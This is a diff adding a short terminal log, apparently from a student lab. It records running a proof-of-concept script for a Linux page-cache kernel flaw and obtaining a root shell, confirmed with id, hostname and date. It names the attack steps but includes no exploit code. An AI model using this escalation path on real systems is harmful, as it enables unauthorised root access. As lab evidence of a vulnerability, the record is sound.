@@ -1,0 +1,15 @@
+student@copy-fail-Pamela-Toapanta:~$ python3 ~/copy_fail_exp.py
+[*] Launching CVE-2026-31431 Copy Fail PoC...
+[*] Splicing page cache into target...
+[*] Triggering crypto_authenc_esn_decrypt logical flaw...
+[+] Success! Page cache poisoned successfully.
+[+] Escalating privileges via modified suid binary...
+
+# id
+uid=0(root) gid=0(root) groups=0(root),0(root)
+
+# hostname
+copy-fail-Pamela-Toapanta
+
+# date -u
+Wed May 20 18:24:13 UTC 2026
